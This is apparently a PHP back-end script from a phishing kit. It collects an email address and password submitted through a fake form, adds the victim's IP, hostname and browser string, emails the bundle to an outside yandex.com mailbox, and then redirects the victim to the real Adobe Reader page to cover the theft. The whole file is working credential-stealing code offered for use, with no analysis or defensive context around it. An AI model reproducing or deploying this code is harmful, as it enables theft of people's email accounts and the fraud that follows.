<?php

$ThanksURL =   "https://get.adobe.com/reader/";  //confirmation page
$Okman= "msohodra@yandex.com";
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$hostname = gethostbyaddr($ip);
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$message  = "==========+[ User & Pass ]+==========\n";
$message .= "Email : ".$_POST['formtext1']."\n";
$message .= "Email Password : ".$_POST['formtext2']."\n";
$message .= "========= [ Ip & Hostname Info ] =======\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Useragent : ".$user_agent."\n";
$message .= "=============+ KwAb0  ===========\n";
$subject = "Ali Rezlt $ip $datamasii";
$headers .= "From: GoodyBag <mic@Rezlt.org>";
mail($Okman,$subject,$message,$headers);
header("Location: $ThanksURL");

?>